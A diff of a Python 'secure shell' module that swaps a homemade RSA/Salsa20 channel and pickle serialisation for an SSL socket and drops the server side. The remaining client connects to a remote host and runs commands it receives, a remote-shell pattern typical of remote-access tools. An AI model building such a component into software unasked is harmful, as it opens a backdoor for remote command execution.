@@ -3,80 +3,56 @@
 # Description: Secure shell
 
 import os 
+import ssl
 import socket
-import pickle
 import subprocess
-from time import sleep
+from time import sleep 
 from queue import Queue 
 from threading import Thread 
 from socket import timeout as TimeOutError
-from . crypto import CryptoRSA, CryptoSalsa20
 
 class Communicate(object):
 
- def __init__(self, private_key, session, recipient_public_key):
-  self.recipient_public_key = recipient_public_key
-  self.private_key = private_key
+ def __init__(self, session):
+  self.recvs_decrypted = Queue()
   self.session_recv = 4096**2
   self.session = session
   self.is_alive = True
   self.pending = False 
   self.resp = None 
 
-  self.recvs_encrypted = Queue()
-  self.recvs_decrypted = Queue()
-
  def recv(self):
   self.session.settimeout(0.5)
   while self.is_alive:
    try:
     recv = self.session.recv(self.session_recv)
+
     if recv:
-     self.recvs_encrypted.put(recv)
+     self.resp = None
+     self.pending = False
+     data = recv.decode('utf8')
+     if data != '-1':
+      self.recvs_decrypted.put(data)
+      self.resp = data
+
     else:self.stop()
    except TimeOutError:pass
    except:self.stop()
 
- def recv_parser(self):
-  while self.is_alive:
-   while self.recvs_encrypted.qsize():
-    if not self.is_alive:break
-    try:
-     pkt = pickle.loads(self.recvs_encrypted.get())
-     ciphertext = pkt['ciphertext']
-     nonce = pkt['nonce']
-     key = CryptoRSA.decrypt(self.private_key, pkt['key'])
-     data = CryptoSalsa20.decrypt(ciphertext, key, nonce).decode('utf8')
-     self.pending = False
-     self.resp = None
-     if data != '-1':
-      self.resp = data
-      self.recvs_decrypted.put(data)
-    except:
-     pass 
-
  def send(self, data):
   if len(data.strip()):
    if not self.is_alive:return 
-   cipher = CryptoSalsa20.encrypt(data.encode('utf8'))
-   ciphertext, key, nonce = cipher[0], CryptoRSA.encrypt(self.recipient_public_key, cipher[1]), cipher[2]
-   pkt = pickle.dumps({ 'ciphertext': ciphertext, 'key': key, 'nonce': nonce })
    try:
-    self.session.sendall(pkt)
+    self.session.sendall(data.encode('utf8'))
     self.pending = True
    except:
     pass 
 
  def start(self):
   recv = Thread(target=self.recv)
-  parser = Thread(target=self.recv_parser)
-
-  recv.daemon = True 
-  parser.daemon = True
-
+  recv.daemon = True   
   recv.start()
-  parser.start() 
-  
+    
  def stop(self):
   self.is_alive = False 
 
@@ -104,7 +80,7 @@ class Client(object):
 
   if cmd.split()[0] == 'cd':
    if len(cmd.split()) != 1:
-    path = cmd.split()[1]
+    path = ' '.join(cmd.split()[1:])
     if os.path.exists(path):
      os.chdir(path)
    else:
@@ -116,29 +92,8 @@ class Client(object):
  def stop(self):
   self.is_alive = False
   self.communication.is_alive = False
-
-class Server(object):
-
- def __init__(self, communication, home):
-  self.communication = communication
-  self.communication.start()
-  self.is_alive = True
-  self.home = home 
-  
- def stop(self):
-  self.is_alive = False
-  self.communication.is_alive = False
-
- def send(self, cmd):
-  if len(cmd.strip()):
-   if not self.communication.pending:
-    self.communication.send(cmd)
-    while all([self.is_alive, self.communication.is_alive, self.communication.pending]):pass 
-    return self.communication.resp 
    
 class SSH(object):
-
- RSA_KEY_SIZE = 1280 # Apple's iMessage RSA key size
 
  def __init__(self, ip, port, home, max_time=10, verbose=False):
   self.ip = ip 
@@ -146,63 +101,13 @@ class SSH(object):
   self.home = home
   self.verbose = verbose
   self.max_time = max_time
-  self.session_size = 64**2
   self.communication = None 
   self.recipient_session = None
-  self.recipient_public_key = None 
-  
-  self.display('Generating RSA key pair ...')
-  self.public_key, self.private_key = CryptoRSA.generate_keys(self.RSA_KEY_SIZE)
-  self.display('Keys generated')
-
+    
  def display(self, msg):
   if self.verbose:
    print('{}\n'.format(msg))
-
- def handshake(self, is_server=False):
-  if is_server:
-   # receive public key
-   self.recipient_public_key = self.recipient_session.recv(self.session_size)
-   
-   # send public key
-   sleep(0.5)
-   self.recipient_session.sendall(self.public_key)
-  else:
-   # send public key
-   sleep(0.5)
-   self.recipient_session.sendall(self.public_key)
-
-   # receive public key
-   self.recipient_public_key = self.recipient_session.recv(self.session_size)
-   
- def server(self):
-  server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-  server_socket.settimeout(self.max_time)  
-
-  try:
-   server_socket.bind((self.ip, self.port))
-   server_socket.listen(1)
-  except OSError:
-   self.display('Failed to start ssh server on {}:{}'.format(self.ip, self.port))
-   return -1
-  
-  try:
-   self.recipient_session, addr = server_socket.accept() 
-  except TimeOutError:
-   self.display('Server timed out')
-   return -1
-
-  self.handshake(is_server=True)
-  communication = Communicate(self.private_key, 
-                              self.recipient_session, 
-                              self.recipient_public_key)
-  if self.communication:
-   self.communication.stop()
-
-  self.communication = Server(communication, self.home)
-  return 0
-  
+     
  def close(self):
   try:
    if self.communication:self.communication.stop()
@@ -215,7 +120,8 @@ class SSH(object):
    return self.communication.send(cmd)
     
  def client(self):
-  self.recipient_session = socket.socket()
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  self.recipient_session = ssl.wrap_socket(sock, ca_certs=r'public.crt', cert_reqs=ssl.CERT_REQUIRED)
   self.recipient_session.settimeout(self.max_time)
   try:
    self.recipient_session.connect((self.ip, self.port))
@@ -223,10 +129,7 @@ class SSH(object):
    self.display('Failed to connect to {}:{}'.format(self.ip, self.port))
    return -1
 
-  self.handshake(is_server=False)
-  communication = Communicate(self.private_key, 
-                              self.recipient_session, 
-                              self.recipient_public_key)
+  communication = Communicate(self.recipient_session)
 
   if self.communication:
    self.communication.stop()
